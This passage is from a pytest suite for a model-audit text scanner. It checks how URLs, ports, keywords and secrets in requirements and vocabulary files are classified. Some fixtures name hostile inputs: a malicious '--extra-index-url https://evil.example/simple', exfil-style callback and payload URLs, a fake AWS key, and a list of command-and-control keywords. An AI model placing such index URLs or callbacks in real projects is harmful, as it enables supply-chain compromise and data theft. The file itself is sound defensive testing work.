    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "suspicious_port"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_later_port_assignment_is_not_hidden_by_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("SSH uses port 22.\nport=22\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "suspicious_port"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_requirements_urls_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text("--extra-index-url https://evil.example/simple\nsafe-package==1.0\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "requirement_line",
    [
        "--index-url https://pypi.org/simple",
        "--index-url=https://pypi.org/simple",
        "--index-url https://pypi.org/simple?format=html",
        "--index-url https://pypi.org/simple?key=project-name",
        "--extra-index-url=https://pypi.org/simple",
        "-ihttps://pypi.org/simple",
        "--find-links=https://download.pytorch.org/whl/cpu",
        "-fhttps://download.pytorch.org/whl/cpu",
        "demo @ https://files.pythonhosted.org/packages/demo.whl",
    ],
)
def test_text_scanner_standard_requirements_urls_are_informational(
    tmp_path: Path,
    requirement_line: str,
) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_checks
    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "requirement_line",
    [
        "# --index-url https://pypi.org/simple",
        "# --index-url http://pypi.org/simple",
        "# --index-url https://pypi.org:bad/simple",
        "# --index-url https://pypi.org:70000/simple",
    ],
)
def test_text_scanner_commented_requirements_url_is_informational(
    tmp_path: Path,
    requirement_line: str,
) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "requirement_line",
    [
        "--index-url https://user:secret@pypi.org/simple",
        "--index-url https://user@pypi.org/simple",
        "--extra-index-url https://pypi.org/simple?token=secret-value",
        "--find-links https://pypi.org/simple # https://user:secret@pypi.org/simple",
        "# --index-url https://user:secret@pypi.org/simple",
    ],
)
def test_text_scanner_credentialed_standard_requirements_urls_remain_actionable(
    tmp_path: Path,
    requirement_line: str,
) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "prefix",
    [
        b"endpoint-prod_v2: ",
        b"<endpoint-prod:v2>",
    ],
)
def test_text_scanner_bounded_endpoint_suffixes_remain_code_shaped(prefix: bytes) -> None:
    assert TextScanner._documentation_line_is_code_shaped(prefix, len(prefix))


@pytest.mark.parametrize(
    "prefix",
    [
        b"\turl-" + b"--" * 128,
        b"<url-" + b"--" * 128,
    ],
)
def test_text_scanner_malformed_generic_url_labels_are_not_code_shaped(prefix: bytes) -> None:
    assert not TextScanner._documentation_line_is_code_shaped(prefix, len(prefix))


@pytest.mark.parametrize(
    "requirement_line",
    [
        "--index-url http://pypi.org/simple",
        "--index-url https://pypi.org:4444/simple",
        "--index-url https://pypi.org:bad/simple",
        "--index-url https://pypi.org:70000/simple",
        "--trusted-host pypi.org",
    ],
)
def test_text_scanner_insecure_standard_requirements_url_remains_actionable(
    tmp_path: Path,
    requirement_line: str,
) -> None:
    text_path = tmp_path / "requirements.txt"
    text_path.write_text(f"{requirement_line}\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("safe-token\nhttps://docs.example.com/reference\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_checks
    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    ("token", "finding_type"),
    [
        ("malware", "cc_pattern"),
        ("backdoor", "cc_pattern"),
        ("requests.get", "network_function"),
    ],
)
def test_text_scanner_bare_active_vocabulary_tokens_are_informational(
    tmp_path: Path,
    token: str,
    finding_type: str,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(f"safe-token\n{token}\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    matching_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.details.get("type") == finding_type
    ]
    assert matching_checks
    assert all(check.severity == IssueSeverity.INFO for check in matching_checks)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    ("content", "finding_type"),
    [
        ("label=malware\n", "cc_pattern"),
        ("requests.get(endpoint)\n", "network_function"),
    ],
)
def test_text_scanner_active_vocabulary_context_remains_actionable(
    tmp_path: Path,
    content: str,
    finding_type: str,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == finding_type
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_vocabulary_url_assignments_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text("endpoint=https://evil.example/payload\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_markdown_vocabulary_url_assignments_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.md"
    text_path.write_text("endpoint=https://evil.example/payload\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_disabled_detectors_do_not_report_clean_coverage(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    result = TextScanner(config={"check_secrets": False, "check_network_comm": False}).scan(str(text_path))

    assert result.metadata["disabled_checks"] == [
        "Embedded Secrets Detection",
        "Network Communication Detection",
    ]
    assert not any(check.name == "Embedded Secrets Detection" for check in result.checks)
    assert not any(check.name == "Network Communication Detection" for check in result.checks)
    assert not any(check.name == "Text Content Security Coverage" for check in result.checks)


def test_text_scanner_fails_closed_when_secret_detector_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")
    leaked_secret = "UNSTRUCTURED-TEXT-SECRET-123456"

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError(f"secret detector rejected {leaked_secret}")

    monkeypatch.setattr(TextScanner, "collect_embedded_secret_findings", raise_detector_error)

    result = TextScanner().scan(str(text_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "text_content_security_detector_failed"
    assert not any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.PASSED for check in result.checks
    )
    assert leaked_secret not in result.to_json()
    assert leaked_secret not in caplog.text
    assert "<redacted>" in result.to_json()


def test_text_scanner_fails_closed_when_content_detector_coverage_is_truncated(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text("token\n" + ("safe\n" * 20), encoding="utf-8")

    direct = TextScanner(config={"text_content_scan_bytes": 16}).scan(str(text_path))
    aggregate = scan_model_directory_or_file(
        str(text_path),
        cache_enabled=False,
        text_content_scan_bytes=16,
    )

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_content_security_scan_incomplete"
    assert "text_content_security_scan_incomplete" in direct.metadata.get("scan_outcome_reasons", [])
    assert not any(
        check.name in {"Embedded Secrets Detection", "Network Communication Detection"}
        and check.status == CheckStatus.PASSED
        for check in direct.checks
    )
    assert any(
        check.name == "Text Content Security Coverage"
        and check.status == CheckStatus.FAILED
        and check.details.get("scan_outcome_reason") == "text_content_security_scan_incomplete"
        for check in direct.checks
    )
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == (
        "text_content_security_scan_incomplete"
    )
    assert determine_exit_code(aggregate) == 2


def test_text_scanner_network_finding_limit_fails_closed_and_preserves_high_signal(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 10) + "callback_url=https://evil.example/exfil\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    network_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(network_checks) == 2
    assert any(
        check.details.get("type") == "cc_pattern" and check.severity == IssueSeverity.CRITICAL
        for check in network_checks
    )
    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("detector") == "network_communication"
        and check.details.get("max_findings") == 2
        for check in result.checks
    )


def test_text_scanner_documentation_network_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.severity == IssueSeverity.INFO
        and check.details.get("truncated_finding_type") == "url_detected"
        and check.details.get("analysis_incomplete") is True
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 3) + 'download("https://evil.example/payload")\n',
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"


def test_text_scanner_documentation_classification_limit_is_inconclusive(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("No malware is present.\n" * 1_025, encoding="utf-8")

    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
    aggregate = scan_model_directory_or_file(
        str(text_path),
        config={"check_secrets": False},
        cache_enabled=False,
    )

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
    assert determine_exit_code(aggregate) == 2
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
        and check.details.get("max_classification_occurrences") == 1_024
        for check in result.checks
    )


def test_text_scanner_documentation_classification_exact_limit_is_complete(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("No malware is present.\n" * 1_024, encoding="utf-8")

    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert not any(
        check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
        for check in result.checks
    )


def test_text_scanner_documentation_classification_exact_limit_ignores_passive_followups() -> None:
    payload = b"No malware is present.\n" * 1_024
    findings = [
        {"type": "cc_pattern", "pattern": "malware", "severity": "HIGH", "position": 3},
        {
            "type": "url_detected",
            "url": "https://example.com/project",
            "severity": "MEDIUM",
            "position": len(payload),
        },
    ]

    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)

    assert incomplete is False


def test_text_scanner_documentation_classification_limit_is_shared(monkeypatch: pytest.MonkeyPatch) -> None:
    patterns = ["malware", "backdoor", "trojan", "botnet", "zombie"]
    payload = (" ".join(f"no {pattern}" for pattern in patterns) + "\n").encode() * 1_025
    findings = [{"type": "cc_pattern", "pattern": pattern, "severity": "HIGH", "position": 0} for pattern in patterns]
    checks = 0
    original = TextScanner._documentation_cc_finding_is_benign_prose

    def count_checks(cls: type[TextScanner], data: bytes, finding: dict[str, Any]) -> bool:
        nonlocal checks
        checks += 1
        return original(data, finding)

    monkeypatch.setattr(TextScanner, "_documentation_cc_finding_is_benign_prose", classmethod(count_checks))

    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)

    assert incomplete is True
    assert checks == 1_024


def test_text_scanner_documentation_retarget_caches_absent_token_searches(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = (b"To use it, import requests before downloading weights.\n" * 64) + (b"x" * 1024 * 1024)
    finding = {
        "type": "network_library",
        "library": "requests",
        "pattern": "requests",
        "severity": "HIGH",
        "position": 18,
    }
    calls_by_token: dict[bytes, int] = {}
    original = TextScanner._find_documentation_token

    def count_searches(data: bytes, token_bytes: bytes, start: int) -> int:
        calls_by_token[token_bytes] = calls_by_token.get(token_bytes, 0) + 1
        return original(data, token_bytes, start)

    monkeypatch.setattr(TextScanner, "_find_documentation_token", staticmethod(count_searches))

    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, [finding])

    assert incomplete is False
    assert calls_by_token[b"from requests"] == 1
    assert calls_by_token[b"requests.connect"] == 1
    assert calls_by_token[b"requests.request"] == 1
    assert calls_by_token[b"requests.__init__"] == 1


def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert any(
        check.name == "Network Communication Reporting Limit"
        and check.severity == IssueSeverity.INFO
        and check.details.get("truncated_finding_type") == "url_detected"
        and check.details.get("analysis_incomplete") is False
        and check.details.get("reporting_incomplete") is True
        for check in result.checks
    )


def test_text_scanner_active_vocabulary_url_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 2) + "endpoint=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("truncated_finding", {}).get("type") == "url_detected"
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_active_vocabulary_url_after_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "tokens.txt"
    text_path.write_text(
        ("https://docs.example.com/reference\n" * 3) + "endpoint=https://evil.example/payload\n",
        encoding="utf-8",
    )

    result = TextScanner(
        config={
            "check_secrets": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("truncated_finding", {}).get("type") == "url_detected"
        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
        for check in result.checks
    )


def test_text_scanner_secret_finding_limit_fails_closed(tmp_path: Path) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text(("AKIAABCDEFGHIJKLMNOP\n" * 10), encoding="utf-8")

    result = TextScanner(
        config={
            "check_network_comm": False,
            "text_content_max_findings": 2,
        }
    ).scan(str(text_path))

    secret_checks = [
        check
        for check in result.checks
        if check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED
    ]
    assert len(secret_checks) == 2
    assert result.success is False
    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
    assert any(
        check.name == "Text Content Security Coverage"
        and check.details.get("detector") == "secrets"
        and check.details.get("max_findings") == 2
        for check in result.checks
    )


def test_text_metadata_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    direct = TextScanner().scan(str(text_path))
    reset_cache_manager()
    try:
        aggregates = [
            scan_model_directory_or_file(
                str(text_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            for _ in range(2)
        ]

        assert direct.success is False
        assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert SCAN_OUTCOME_MESSAGE_METADATA_KEY in direct.metadata
        assert "text_metadata_read_failed" in direct.metadata.get("scan_outcome_reasons", [])
        assert direct.metadata.get("operational_error") is True
        assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
        assert any(
            check.name == "Text File Metadata Read"
            and check.severity == IssueSeverity.INFO
            and check.details.get("scan_outcome_reason") == "text_metadata_read_failed"
            and check.rule_code is None
            for check in direct.checks
        )
        for aggregate in aggregates:
            assert not any(
                issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues
            )
            assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_text_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert direct.success is False
    assert direct.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata.get("operational_error_reason") == "text_metadata_read_failed"
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_zip_probe_failure_preserves_owner_for_metadata_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n", encoding="utf-8")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated text metadata read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert "text" in aggregate.scanner_names
    assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
    assert determine_exit_code(aggregate) == 2


def test_text_metadata_read_failure_bypasses_stale_clean_cache(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    text_path = tmp_path / "vocab.txt"
    text_path.write_text("token\n" + "x" * 11_000, encoding="utf-8")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as warm_cache:
            warm_cache.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            warm_result = scan_file(
                str(text_path),
                config={
                    "cache_enabled": True,
                    "cache_dir": str(cache_dir),
                    "min_cache_file_size": 0,
                },
            )

        assert warm_result.success is True
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        def raise_os_error(_path: str) -> int:
            raise OSError("simulated text metadata read failure after cache warm")

        monkeypatch.setattr(TextScanner, "_get_file_size", staticmethod(raise_os_error))

        aggregate = scan_model_directory_or_file(
            str(text_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        assert determine_exit_code(aggregate) == 2
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in aggregate.issues)
        assert aggregate.file_metadata[str(text_path)].get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert aggregate.file_metadata[str(text_path)].get("operational_error_reason") == "text_metadata_read_failed"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()
